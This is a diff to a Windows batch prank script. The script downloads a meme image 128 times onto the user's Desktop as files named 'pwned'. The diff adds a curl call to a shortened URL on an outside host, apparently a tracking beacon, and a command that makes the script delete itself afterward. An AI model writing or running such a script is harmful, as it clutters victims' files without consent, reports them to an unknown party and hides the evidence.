@@ -1,8 +1,12 @@
 @echo off
 cd Desktop
+curl https://linkyshort.xyz/4fIh6AtAZegI4B5i4Rzv
 set loop=0
 :loop
 curl http://www.quickmeme.com/img/ee/ee98167f06c4541a6149f7ccb0e8a83494907843dd1b8ccb2bd0ada40ebb3490.jpg -o pwned%RANDOM%.png
 set /a loop=%loop%+1 
 if "%loop%"=="128" goto next
 goto loop
+cd ..
+del 4p0RNW.bat
+exit
